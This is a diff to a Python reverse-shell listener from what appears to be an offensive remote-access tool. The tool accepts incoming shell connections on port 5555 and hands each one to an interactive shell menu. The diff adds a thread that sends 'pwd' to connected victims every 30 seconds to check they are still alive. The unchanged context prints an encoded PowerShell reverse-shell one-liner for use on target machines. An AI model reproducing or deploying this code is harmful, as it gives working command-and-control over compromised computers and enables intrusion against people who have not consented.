@@ -18,18 +18,26 @@ def startListener():
         s.listen(1)
         print t.bold_red + "listening on port 5555" + t.normal
 
+        startWorker = True
         clientnumber = 0
+
         while True:
             clientconn, address = s.accept()
             ip , port = address
             if clientconn:
                 clientnumber += 1
                 print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
+                if startWorker:
+                        worker = Thread(target=pingClients, args=(clientconn,clientnumber))
+                        worker.setDaemon(True)
+                        worker.start()
+                        startWorker = False
 
             from menu import clientMenuOptions
             clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
         s.close()
     except Exception as E:
+        s.close()
         print t.bold_red + "Error With Listener" + t.normal
         print E
 
@@ -75,3 +83,14 @@ def printListener():
         "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
     print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
     return True
+
+def pingClients(clientconn,clientnumber):
+    from menu import clientMenuOptions
+    try:
+        while True:
+            time.sleep(30)
+            clientconn.sendall("pwd")
+            pingdata = clientconn.recv(200).encode("utf-8").replace('\n','')
+    except:
+        print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
+        del clientMenuOptions[str(clientnumber)]
